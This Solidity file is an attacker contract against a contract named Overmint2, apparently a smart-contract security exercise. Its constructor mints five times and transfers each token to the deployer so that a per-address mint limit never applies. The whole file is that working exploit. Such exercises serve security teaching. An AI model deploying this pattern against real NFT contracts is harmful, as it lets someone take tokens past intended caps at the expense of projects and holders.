// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import { Overmint2 } from "../Overmint2.sol";
import "hardhat/console.sol";

contract Overmint2Attacker {
   Overmint2 public victimContract;

  constructor(address _victimContract) {
    victimContract = Overmint2(_victimContract);

    victimContract.mint(); // 1st mint
    victimContract.transferFrom(address(this), msg.sender, 1);

    victimContract.mint(); // 2nd mint
    victimContract.transferFrom(address(this), msg.sender, 2);

    victimContract.mint(); // 3rd mint
    victimContract.transferFrom(address(this), msg.sender, 3);

    victimContract.mint(); // 4th mint
    victimContract.transferFrom(address(this), msg.sender, 4);

    victimContract.mint(); // 5th mint
    victimContract.transferFrom(address(this), msg.sender, 5);
  }
}
